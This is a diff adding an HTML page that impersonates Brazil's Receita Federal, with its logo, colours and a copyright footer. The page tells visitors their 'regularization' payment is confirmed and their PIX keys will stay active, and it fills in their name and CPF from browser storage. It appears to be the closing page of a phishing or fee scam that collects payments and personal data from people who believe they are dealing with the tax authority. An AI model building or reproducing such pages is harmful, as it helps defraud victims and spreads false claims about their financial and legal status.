@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta content="width=device-width, initial-scale=1.0" name="viewport" />
+    <title>PIX Liberado - Receita Federal</title>
+    <link href="css/all.min.css" rel="stylesheet" />
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+      @font-face {
+        font-family: "Rawline";
+        src: url("fonts/rawline-400.ea42a37247439622.woff2") format("woff2");
+        font-weight: 400;
+        font-style: normal;
+      }
+      @font-face {
+        font-family: "Rawline";
+        src: url("fonts/rawline-400i.1701033bc0b08320.woff2") format("woff2");
+        font-weight: 400;
+        font-style: italic;
+      }
+      @font-face {
+        font-family: "Rawline";
+        src: url("fonts/rawline-500.f8af4ec801afaa28.woff2") format("woff2");
+        font-weight: 500;
+        font-style: normal;
+      }
+      @font-face {
+        font-family: "Rawline";
+        src: url("fonts/rawline-600.844a17f0db94d147.woff2") format("woff2");
+        font-weight: 600;
+        font-style: normal;
+      }
+      @font-face {
+        font-family: "Rawline";
+        src: url("fonts/rawline-700.1c7c76152b40409f.woff2") format("woff2");
+        font-weight: 700;
+        font-style: normal;
+      }
+      @font-face {
+        font-family: "Rawline";
+        src: url("fonts/rawline-800.5c5f78761d00551b.woff2") format("woff2");
+        font-weight: 800;
+        font-style: normal;
+      }
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: "Rawline", sans-serif;
+      }
+      body {
+        background-color: #f8f9fa;
+        padding-top: 60px;
+        color: #333333;
+        font-size: 16px;
+        line-height: 1.5;
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+      }
+      .header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 8px 20px;
+        background-color: white;
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        z-index: 1000;
+        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        height: 60px;
+      }
+      .logo {
+        width: 140px;
+        height: auto;
+      }
+      .header-icons {
+        display: flex;
+        gap: 15px;
+      }
+      .header-icon {
+        font-size: 18px;
+        color: #0056b3;
+      }
+      .container {
+        max-width: 600px;
+        margin: 20px auto;
+        padding: 0 20px;
+        flex: 1;
+      }
+      .success-card {
+        background: white;
+        padding: 30px;
+        border-radius: 8px;
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        margin-bottom: 20px;
+        border-left: 4px solid #28a745;
+        text-align: center;
+      }
+      .success-icon {
+        font-size: 48px;
+        color: #28a745;
+        margin-bottom: 20px;
+      }
+      .success-title {
+        color: #28a745;
+        font-size: 24px;
+        font-weight: 700;
+        margin-bottom: 15px;
+      }
+      .user-info {
+        background: white;
+        padding: 20px;
+        border-radius: 8px;
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        margin: 20px 0;
+        border-left: 4px solid #0c326f;
+      }
+      .footer {
+        background-color: #01205b;
+        color: white;
+        padding: 16px;
+        text-align: center;
+        margin-top: auto;
+      }
+      .footer-logo {
+        width: 100px;
+        margin: 0 auto 8px;
+        display: block;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="header">
+      <img
+        alt="Logo da Receita Federal"
+        class="logo"
+        src="images/receitaAzul.svg"
+      />
+      <div class="header-icons">
+        <i class="fas fa-search header-icon"></i>
+        <i class="fas fa-question-circle header-icon"></i>
+        <i class="fas fa-adjust header-icon"></i>
+      </div>
+    </div>
+
+    <div class="container">
+      <div class="success-card">
+        <i class="fas fa-check-circle success-icon"></i>
+        <h1 class="success-title">Pagamento Confirmado!</h1>
+        <p style="font-size: 18px; margin-bottom: 20px">
+          Suas chaves PIX continuarão ativas e disponíveis para uso.
+        </p>
+      </div>
+
+      <div class="user-info">
+        <h3 style="color: #0c326f; font-weight: 600; margin-bottom: 15px">
+          Detalhes da Regularização
+        </h3>
+        <p><strong>Nome:</strong> <span id="userName"></span></p>
+        <p><strong>CPF:</strong> <span id="userCpf"></span></p>
+        <p style="margin-top: 15px">
+          <i class="fas fa-info-circle" style="color: #0c326f"></i>
+          Suas chaves PIX estão liberadas para uso em todas as instituições
+          financeiras.
+        </p>
+      </div>
+
+      <div
+        style="
+          background: #e8f5e9;
+          padding: 20px;
+          border-radius: 8px;
+          margin: 20px 0;
+        "
+      >
+        <p style="color: #2e7d32; font-weight: 600; margin-bottom: 10px">
+          <i class="fas fa-shield-alt"></i>
+          Situação: REGULAR
+        </p>
+        <p>
+          Seu CPF está em conformidade com as normas do Banco Central do Brasil
+          para operações PIX.
+        </p>
+      </div>
+    </div>
+
+    <footer class="footer">
+      <img
+        src="https://www.enat.receita.economia.gov.br/pt-br/area_nacional/noticias/logo-rfb/image_preview"
+        alt="Receita Federal Logo"
+        class="footer-logo"
+      />
+      <p>© 2025 Receita Federal do Brasil. Todos os direitos reservados.</p>
+    </footer>
+
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        // Recuperar dados do usuário do localStorage
+        const userData = JSON.parse(localStorage.getItem("userData") || "{}");
+
+        // Função para formatar CPF
+        function formatCPF(cpf) {
+          cpf = cpf.replace(/\D/g, "");
+          return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+        }
+
+        // Atualizar informações na página
+        document.getElementById("userName").textContent = userData.nome || "";
+        document.getElementById("userCpf").textContent = userData.cpf
+          ? formatCPF(userData.cpf)
+          : "";
+      });
+    </script>
+  </body>
+</html>
